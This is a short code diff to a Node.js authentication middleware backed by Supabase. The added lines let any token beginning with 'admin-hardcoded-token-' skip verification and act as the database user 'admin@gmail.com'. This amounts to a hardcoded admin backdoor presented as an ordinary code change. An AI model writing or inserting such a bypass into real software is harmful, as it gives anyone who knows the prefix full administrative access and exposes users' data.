@@ -8,6 +8,26 @@ const authenticate = async (req, res, next) => {
       return res.status(401).json({ error: 'No token provided' });
     }
 
+    // Check for hardcoded admin token
+    if (token.startsWith('admin-hardcoded-token-')) {
+      console.log('Admin hardcoded token detected');
+
+      // Fetch admin user from database
+      const { data: adminData, error: adminError } = await supabase
+        .from('users')
+        .select('*')
+        .eq('email', 'admin@gmail.com')
+        .single();
+
+      if (adminError || !adminData) {
+        console.error('Admin user not found in database');
+        return res.status(404).json({ error: 'Admin user not found' });
+      }
+
+      req.user = adminData;
+      return next();
+    }
+
     const { data: { user }, error } = await supabase.auth.getUser(token);
 
     if (error) {
